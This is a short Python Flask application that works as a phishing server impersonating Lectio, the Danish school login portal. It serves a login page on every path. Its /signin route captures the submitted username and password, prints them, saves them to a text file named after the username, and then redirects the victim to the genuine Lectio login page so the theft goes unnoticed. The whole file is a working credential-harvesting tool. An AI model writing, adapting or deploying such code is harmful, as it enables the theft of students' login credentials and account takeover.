from flask import Flask, request, render_template, redirect
import json

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    return render_template("index.html")

@app.errorhandler(404)
def page_not_found(error):
    return render_template("index.html")

@app.route("/signin", methods=["GET", "POST"])
def sign():
    if request.method == "POST":
        print("POST REQEUST RECIEVED")
        password = request.form.get("password")
        username = request.form.get("username")
        print("USERNAME: " + username)
        print("PASSWORD: " + password)

        output = "USERNAME: " + username + " PASSWORD: " + password

        f = open(username + ".txt", "w")
        f.write(output)
        f.close()

        return redirect("https://www.lectio.dk/lectio/20/login.aspx?prevurl=FindSkema.aspx%3ftype%3delev")

    return redirect("https://www.lectio.dk/lectio/20/login.aspx?prevurl=FindSkema.aspx%3ftype%3delev")

if __name__ == "__main__":
    app.run()
